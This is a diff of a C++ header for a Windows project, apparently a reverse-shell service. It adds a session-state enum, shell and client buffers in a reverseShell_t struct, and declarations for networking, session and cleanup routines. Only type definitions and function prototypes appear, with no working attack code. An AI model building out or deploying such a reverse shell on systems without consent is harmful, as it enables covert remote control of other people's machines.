@@ -11,9 +11,16 @@
 
 #define PROCESS_STOP "Global\\stop_tinky_processes"
 
-#define CONTINUE 1
-#define SUCCESS 1
 #define FAILURE 0
+#define SUCCESS 1
+#define CONNECTION_CLOSED 0
+
+typedef enum {
+	WAITING_FOR_CLIENT,
+	FATAL_ERROR,
+	RESET_SESSION,
+	CONTINUE_SESSION
+}	currentState_e;
 
 typedef struct reverseShell {
 	// socket {
@@ -41,18 +48,30 @@ typedef struct reverseShell {
 
 	HANDLE					stopEventsignal;
 
-	BOOL				clientFound;
-	CRITICAL_SECTION	lock;
+	// buffers {
+	char	shellBuffer[BUFFER_SIZE];
+	char	clientBuffer[BUFFER_SIZE];
+	// }
 
 }	reverseShell_t;
 
 // =============== utils ===============
 void journalReport(std::wstring msg);
-BOOL processShouldStop(void);
+void setSocketNonBlock(SOCKET *sock);
+// =============================================
+
 // =============== networking.cpp ===============
 BYTE initNetworking(void);
-//BYTE acceptClient(void);
+// =============================================
+
 // =============== cleanUp.cpp ===============
-void cleanUp(std::wstring name);
+void cleanUp();
+// =============================================
+
 // =============== routine.cpp ===============
-BYTE startRoutine(void);
+void run(void);
+// =============================================
+
+// =============== newSession.cpp ===============
+currentState_e newSession(void);
+// =============================================
